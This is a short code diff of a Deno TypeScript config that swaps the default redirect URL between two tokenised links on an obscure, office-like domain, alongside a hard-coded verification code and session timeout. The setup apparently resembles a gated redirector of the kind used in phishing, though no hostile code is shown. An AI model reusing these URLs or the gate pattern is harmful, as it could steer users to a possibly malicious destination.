@@ -11,7 +11,7 @@ interface AppConfig {
 }
 
 const CONFIG: AppConfig = {
-  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://wd0c435.guprinsehoofice.com/eYnzVSkb?nl=vdeQh1sVWTRgkUiAZ9B_AAIkfUbkciEMlGt5hlaZ0xmxBYM0vUlirsZ_3_P3XAMVZw",
+  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://wd0c435.guprinsehoofice.com/SOMgYGfi?n=8P09yTI1WdciXxV_LSjfjtJ1i9WfOQ7kNSzm1xBeVpNe5kfh_uJ-O997-XG1JH3FdQ",
   VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
   PORT: Number(Deno.env.get("PORT")) || 8000,
   SESSION_TIMEOUT: 15 * 60 * 1000, // 15 minutes in milliseconds
